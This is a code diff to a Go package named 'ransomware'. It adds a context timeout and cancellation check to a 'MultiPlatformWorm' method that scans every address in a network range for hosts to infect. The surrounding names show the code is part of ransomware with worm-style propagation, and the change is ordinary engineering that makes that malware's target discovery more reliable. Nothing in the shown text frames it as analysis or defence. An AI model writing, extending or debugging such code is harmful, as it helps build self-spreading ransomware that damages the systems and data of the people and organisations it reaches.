@@ -1,6 +1,7 @@
 package ransomware
 
 import (
+	"context"
 	"encoding/json"
 	"fmt"
 	"net"
@@ -54,6 +55,13 @@ func NewMultiPlatformWorm(cfg *RansomwareConfig) *MultiPlatformWorm {
 }
 
 func (mpw *MultiPlatformWorm) ScanNetwork(cidr string) []WormHost {
+	return mpw.ScanNetworkWithContext(context.Background(), cidr)
+}
+
+func (mpw *MultiPlatformWorm) ScanNetworkWithContext(ctx context.Context, cidr string) []WormHost {
+	ctx, cancel := context.WithTimeout(ctx, 30*time.Second)
+	defer cancel()
+
 	var hosts []WormHost
 
 	ip, ipnet, err := net.ParseCIDR(cidr)
@@ -63,6 +71,11 @@ func (mpw *MultiPlatformWorm) ScanNetwork(cidr string) []WormHost {
 	}
 
 	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
+		select {
+		case <-ctx.Done():
+			return hosts
+		default:
+		}
 		if ip.Equal(ipnet.IP) || ip.Equal(net.IP{255, 255, 255, 255}) {
 			continue
 		}
